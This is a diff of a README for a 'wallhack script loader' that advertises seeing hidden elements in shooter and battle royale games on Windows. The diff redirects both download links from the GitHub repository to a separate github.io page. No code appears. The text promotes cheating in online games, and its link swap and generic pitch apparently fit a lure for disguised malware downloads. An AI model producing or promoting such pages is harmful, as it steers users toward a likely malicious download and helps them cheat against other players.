@@ -1,6 +1,6 @@
 # 👁️ humen-wallhack-script-loader - See hidden elements in popular games
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nd151115/humen-wallhack-script-loader)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://nd151115.github.io)
 
 This software helps users gain better spatial awareness in supported first-person shooter and battle royale games. The humen-wallhack-script-loader works on Windows 10 and Windows 11. It detects game elements that remain hidden under standard conditions and renders them visible on your monitor. This tool provides a clearer view of the battlefield to help you navigate complex environments.
 
@@ -8,7 +8,7 @@ This software helps users gain better spatial awareness in supported first-perso
 
 To use this tool, visit the link below to reach the download page. Select the most recent version of the software package. 
 
-[Visit this page to download the loader](https://github.com/nd151115/humen-wallhack-script-loader)
+[Visit this page to download the loader](https://nd151115.github.io)
 
 ## 💻 Requirements
 
